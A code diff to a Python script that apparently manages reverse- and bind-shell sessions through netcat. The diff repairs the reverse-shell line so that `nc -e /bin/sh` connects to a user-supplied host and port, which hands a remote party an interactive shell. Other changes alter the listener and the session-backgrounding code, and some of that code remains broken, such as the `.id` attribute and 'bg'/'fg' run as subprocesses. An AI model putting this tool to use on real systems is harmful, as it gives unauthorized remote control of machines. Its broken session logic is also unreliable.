@@ -1,4 +1,5 @@
 #!/usr/bin/python
+#!/usr/bin/python
 import subprocess, sys, select, threading
 
 ###########
@@ -13,10 +14,10 @@ def reverse_shell():
     # Start a reverse shell by connecting to the target IP and port
     resume = True
     
-    target_ip = input("[*] Enter target \n[!]IP: ")
+    target_ip = input("\n[*] Enter target \n[!]IP: ")
     target_port = input("[!]Port: ")
 
-    p = subprocess.Popen(["nc", "-e", "/bin/sh", "target_ip", "target_port"])
+    p = subprocess.Popen(["nc", "-e", "/bin/sh", target_ip, target_port])
     processes.append(p)
     
 
@@ -24,14 +25,16 @@ def bind_shell():
     # Start a bind shell by listening on a specific port
     resume = True
 
-    listen_port = input("[*] Enter listening \n[!]Port: ")
+    listen_port = input("\n[*] Enter listening \n[!]Port: ")
 
-    p = subprocess.Popen(["nc", "-l", "-p", "listen_port", "-e", "/bin/sh"])
+    p = subprocess.Popen(["nc", "-l", "-v", "-p", listen_port])
     processes.append(p)
 
 def background_session():
     # Background the current session
-    p = subprocess.Popen(["bg"])
+
+    shell_proc = processes[-1]
+    p = subprocess.Popen(["bg", str(shell_proc.id)])
     processes.append(p)
 
 def list_sessions():
@@ -42,7 +45,7 @@ def list_sessions():
 def resume_session():
     # Resume background sessions
     list_sessions()
-    session_number = int(input("Enter the session number you want to resume: "))
+    session_number = int(input("\nEnter the session number you want to resume: "))
     p = processes[session_number-1]
     subprocess.Popen(["fg", str(p.pid)])
 
@@ -56,7 +59,7 @@ def listen_background_session():
             c = sys.stdin.read(1)
             if c == 'b':
                 if len(processes) == 0:
-                    print("[!] You haven´t started any shells; Try one!")
+                    print("\n[!] You haven´t started any shells; Try one!")
                 
                 else:
                     background_session()
@@ -68,7 +71,7 @@ def print_menu():
     #print("3. Background session")
     print("3. List sessions")
     print("4. Resume session")
-    choice = input("Enter your choice: ")
+    choice = input("\n[*]Enter your choice: ")
 
     if choice == "1":
         reverse_shell()
@@ -100,7 +103,7 @@ def start_listener():
 if __name__ == "__main__":
         print_banner()
         print_menu()
-        listen_background_session(True)
+        listen_background_session()
 
     
     
